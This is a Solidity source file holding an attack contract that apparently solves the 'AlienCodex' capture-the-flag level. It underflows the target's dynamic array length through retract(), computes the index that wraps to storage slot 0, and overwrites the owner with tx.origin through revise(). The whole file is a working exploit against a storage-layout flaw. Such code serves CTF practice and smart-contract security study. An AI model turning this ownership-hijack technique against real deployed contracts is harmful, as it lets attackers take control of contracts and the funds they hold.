// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

interface IAlienCodex {
    function make_contact() external;

    function retract() external;

    function revise(uint i, bytes32 _content) external;
}

contract AlienCodexAttack {
    function attack(address _target) public {
        IAlienCodex target = IAlienCodex(_target);
        target.make_contact();

        // Case under flow which can modify all storage slots
        target.retract();
        uint256 index = 2 ** 256 - 1 - uint256(keccak256(abi.encode(1))) + 1;
        target.revise(index, bytes32(uint256(uint160(tx.origin))));
    }
}
